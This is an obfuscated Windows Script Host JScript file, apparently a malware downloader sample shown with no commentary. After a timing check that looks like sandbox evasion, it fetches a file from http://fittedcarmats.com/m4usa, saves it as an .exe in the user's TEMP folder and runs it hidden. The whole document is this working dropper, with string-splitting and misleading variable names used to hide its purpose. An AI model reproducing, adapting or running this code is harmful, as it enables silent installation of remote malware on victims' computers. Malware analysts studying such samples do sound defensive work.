var t0 = false;
var J = "CreateObject";
var uY = function x() {return WScript[J]("WScript.Shell");}(), vr = 11;
var ne = "MSXML2.XMLHTTP";
var wk = 2123213;
var Y = 0;
function x0(ji){uY["Run"](ji, Y, Y);};
function ud(){return "" + ne;};
function Wh(Ne, UR){Y = Y * 1; return Ne - UR;};
function rz(){return J;};
/*@cc_on
  @if (@_win32 || @_win64)
    t0 = true;
  @end
@*/
if (t0)
{
var y = "";
function R(){return 22;};
var t = 0; var ci = 0;
function IZ()
{
var U = new this["Date"]();
var V = U["getUTCMilliseconds"]();
WScript["Sleep"](R());
var U = new this["Date"]();
var iZ = U["getUTCMilliseconds"]();
WScript["Sleep"](R());
var U = new this["Date"]();
var F = U["getUTCMilliseconds"]();
var t = "vX";
t = Wh(iZ, V);
var ci = "D";
ci = Wh(F, iZ);
y = "open";
return Wh(t, ci);
}
var y0 = false;
var NS = false;
for (var Tf = Y; Tf < R() * 1; Tf++){if (IZ() != Y){
y0 = true; 
ci = "31" + 11 * t + ci; 
NS = true; 
break;
}}
function u() {return ((y0 == true) && (y0 == NS)) ? 1 : Y;};
if (y0 && u() && NS){
function wK() {return uY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ANp7e5aW.exe";};
 Z = ud();
 j = WScript[J](Z);
 var RD = 1;
 while (RD){
try {
j[y]("GET", "http://fittedcarmats.com/m4usa", false);
j["send"]();
N = "Sleep";
for (;;){WScript[N](R() * 11); if (j["readystate"] >= 2 * 2) break;};
RD = Y;
} catch(r){};
}
function K(at) {var I = (1, 2, 3, 4, 5, at); return I;};
IW = WScript[rz()]("ADODB.Stream");
Z = IW;
Z[y]();
Z["type"] = K(1);
Z["write"](j["ResponseBody"]);
IW["position"] = K(Y);
Z["Save" + "ToFile"](wK(), 2);
IW["c"+"lose"]();
i = wK();
x0(i);
}
}

